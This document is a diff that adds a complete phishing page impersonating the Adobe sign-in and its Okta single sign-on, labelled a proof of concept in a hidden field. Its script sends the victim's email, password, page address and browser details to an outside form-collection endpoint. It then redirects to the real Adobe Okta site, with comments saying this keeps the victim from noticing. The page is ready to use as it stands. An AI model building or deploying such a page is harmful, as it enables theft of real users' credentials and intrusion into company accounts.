@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+     <html lang="en">
+     <head>
+     <meta charset="UTF-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <title>Sign In | Adobe</title>
+     <link rel="icon" type="image/x-icon" href="https://www.adobe.com/favicon.ico">
+     <style>
+       * { margin: 0; padding: 0; box-sizing: border-box; }
+
+       body {
+         font-family: adobe-clean, 'Source Sans Pro', -apple-system, BlinkMacSystemFont,
+                      'Segoe UI', Roboto, sans-serif;
+         background: #f5f5f5;
+         min-height: 100vh;
+         display: flex;
+         flex-direction: column;
+       }
+
+       /* Top Adobe bar */
+       .adobe-topbar {
+         background: #fa0f00;
+         height: 44px;
+         display: flex;
+         align-items: center;
+         padding: 0 24px;
+       }
+       .adobe-topbar svg { width: 34px; height: 34px; }
+
+       /* Main container */
+       .container {
+         flex: 1;
+         display: flex;
+         align-items: center;
+         justify-content: center;
+         padding: 40px 16px;
+       }
+
+       .login-box {
+         background: #fff;
+         border-radius: 4px;
+         box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+         width: 100%;
+         max-width: 400px;
+         padding: 40px;
+       }
+
+       /* Adobe logo inside box */
+       .logo-wrap {
+         text-align: center;
+         margin-bottom: 24px;
+       }
+       .logo-wrap img {
+         height: 36px;
+       }
+
+       h1 {
+         font-size: 22px;
+         font-weight: 600;
+         color: #2c2c2c;
+         text-align: center;
+         margin-bottom: 6px;
+       }
+
+       .subtitle {
+         text-align: center;
+         color: #6e6e6e;
+         font-size: 13px;
+         margin-bottom: 28px;
+       }
+
+       .form-group {
+         margin-bottom: 16px;
+       }
+
+       label {
+         display: block;
+         font-size: 13px;
+         font-weight: 600;
+         color: #2c2c2c;
+         margin-bottom: 6px;
+       }
+
+       input[type="email"],
+       input[type="password"],
+       input[type="text"] {
+         width: 100%;
+         height: 40px;
+         padding: 8px 12px;
+         border: 1px solid #b2b2b2;
+         border-radius: 3px;
+         font-size: 14px;
+         color: #2c2c2c;
+         background: #fff;
+         transition: border-color 0.15s;
+         outline: none;
+       }
+
+       input:focus {
+         border-color: #1473e6;
+         box-shadow: 0 0 0 2px rgba(20,115,230,0.25);
+       }
+
+       .btn-signin {
+         width: 100%;
+         height: 40px;
+         background: #1473e6;
+         color: #fff;
+         border: none;
+         border-radius: 20px;
+         font-size: 15px;
+         font-weight: 600;
+         cursor: pointer;
+         margin-top: 8px;
+         transition: background 0.15s;
+         display: flex;
+         align-items: center;
+         justify-content: center;
+         gap: 8px;
+       }
+       .btn-signin:hover { background: #0d66d0; }
+       .btn-signin:disabled { background: #a8a8a8; cursor: default; }
+
+       .spinner {
+         display: none;
+         width: 18px; height: 18px;
+         border: 2px solid rgba(255,255,255,0.4);
+         border-top-color: #fff;
+         border-radius: 50%;
+         animation: spin 0.7s linear infinite;
+       }
+       @keyframes spin { to { transform: rotate(360deg); } }
+
+       .links {
+         text-align: center;
+         margin-top: 20px;
+         font-size: 13px;
+       }
+       .links a { color: #1473e6; text-decoration: none; }
+       .links a:hover { text-decoration: underline; }
+
+       .divider {
+         border: none;
+         border-top: 1px solid #e8e8e8;
+         margin: 24px 0;
+       }
+
+       .sso-note {
+         font-size: 12px;
+         color: #6e6e6e;
+         text-align: center;
+       }
+
+       /* Okta footer */
+       .okta-footer {
+         text-align: center;
+         padding: 24px;
+         font-size: 11px;
+         color: #a8a8a8;
+       }
+       .okta-footer a { color: #a8a8a8; }
+
+       /* Loading overlay */
+       .overlay {
+         display: none;
+         position: fixed;
+         inset: 0;
+         background: rgba(255,255,255,0.92);
+         z-index: 999;
+         flex-direction: column;
+         align-items: center;
+         justify-content: center;
+         gap: 16px;
+       }
+       .overlay.show { display: flex; }
+
+       .overlay-spinner {
+         width: 44px; height: 44px;
+         border: 3px solid #e8e8e8;
+         border-top-color: #1473e6;
+         border-radius: 50%;
+         animation: spin 0.9s linear infinite;
+       }
+       .overlay-text {
+         font-size: 14px;
+         color: #6e6e6e;
+       }
+     </style>
+     </head>
+     <body>
+
+     <!-- Adobe red top bar -->
+     <div class="adobe-topbar">
+       <svg viewBox="0 0 34 26" fill="none" xmlns="http://www.w3.org/2000/svg">
+         <path d="M20.307 0H34v26L20.307 0z" fill="#fff"/>
+         <path d="M13.693 0H0v26L13.693 0z" fill="#fff"/>
+         <path d="M17 9.508L22.807 26h-4.234l-1.733-4.918h-5.69L17 9.508z" fill="#fff"/>
+       </svg>
+     </div>
+
+     <!-- Loading overlay -->
+     <div class="overlay" id="overlay">
+       <div class="overlay-spinner"></div>
+       <div class="overlay-text">Signing you in...</div>
+     </div>
+
+     <div class="container">
+       <div class="login-box">
+
+         <div class="logo-wrap">
+           <img src="https://www.adobe.com/content/dam/cc/icons/Adobe_Corporate_Horizontal_Red_HEX.svg"
+                alt="Adobe"
+                onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Adobe_Corporate_Logo.png/560px-Adobe_Corporate_Logo.png'">
+         </div>
+
+         <h1>Sign In</h1>
+         <p class="subtitle">Use your Adobe ID to access all Adobe services</p>
+
+         <form id="loginForm">
+           <!-- Hidden fields for Formspree -->
+           <input type="hidden" name="_subject" value="[PoC] Adobe Credential Capture">
+           <input type="hidden" name="_next" value="https://adobe.okta.com">
+
+           <div class="form-group">
+             <label for="email">Email address</label>
+             <input type="email" id="email" name="email"
+                    placeholder="Enter your Adobe ID email"
+                    autocomplete="username"
+                    required>
+           </div>
+
+           <div class="form-group">
+             <label for="password">Password</label>
+             <input type="password" id="password" name="password"
+                    placeholder="Enter your password"
+                    autocomplete="current-password"
+                    required>
+           </div>
+
+           <button type="submit" class="btn-signin" id="submitBtn">
+             <span id="btnText">Sign In</span>
+             <div class="spinner" id="btnSpinner"></div>
+           </button>
+         </form>
+
+         <div class="links">
+           <a href="https://account.adobe.com/security">Forgot password?</a>
+           &nbsp;&nbsp;|&nbsp;&nbsp;
+           <a href="https://account.adobe.com/security">Get help signing in</a>
+         </div>
+
+         <hr class="divider">
+         <p class="sso-note">
+           Enterprise users — <a href="https://adobe.okta.com">sign in with SSO</a>
+         </p>
+
+       </div>
+     </div>
+
+     <div class="okta-footer">
+       <a href="https://www.okta.com" target="_blank">Secured by Okta</a>
+       &nbsp;·&nbsp;
+       <a href="https://www.adobe.com/privacy.html" target="_blank">Privacy Policy</a>
+       &nbsp;·&nbsp;
+       <a href="https://www.adobe.com/legal/terms.html" target="_blank">Terms of Use</a>
+     </div>
+
+     <script>
+     document.getElementById('loginForm').addEventListener('submit', function(e) {
+       e.preventDefault();
+
+       var btn     = document.getElementById('submitBtn');
+       var btnText = document.getElementById('btnText');
+       var spinner = document.getElementById('btnSpinner');
+       var overlay = document.getElementById('overlay');
+
+       // Show loading state on button
+       btn.disabled = true;
+       btnText.textContent = 'Signing in...';
+       spinner.style.display = 'block';
+
+       var email    = document.getElementById('email').value;
+       var password = document.getElementById('password').value;
+
+       // Send to Formspree
+       fetch('https://formspree.io/f/mykbapzp', {
+         method: 'POST',
+         headers: { 'Content-Type': 'application/json' },
+         body: JSON.stringify({
+           email:    email,
+           password: password,
+           source:   window.location.href,
+           ua:       navigator.userAgent
+         })
+       })
+       .then(function() {
+         // Show full-screen loading overlay
+         overlay.classList.add('show');
+         // Redirect to real Adobe Okta after 3 seconds - victim thinks it just logged in
+         setTimeout(function() {
+           window.location.replace('https://adobe.okta.com');
+         }, 3000);
+       })
+       .catch(function() {
+         // Even on error, redirect - don't show any error to victim
+         overlay.classList.add('show');
+         setTimeout(function() {
+           window.location.replace('https://adobe.okta.com');
+         }, 3000);
+       });
+     });
+     </script>
+
+     </body>
+     </html>
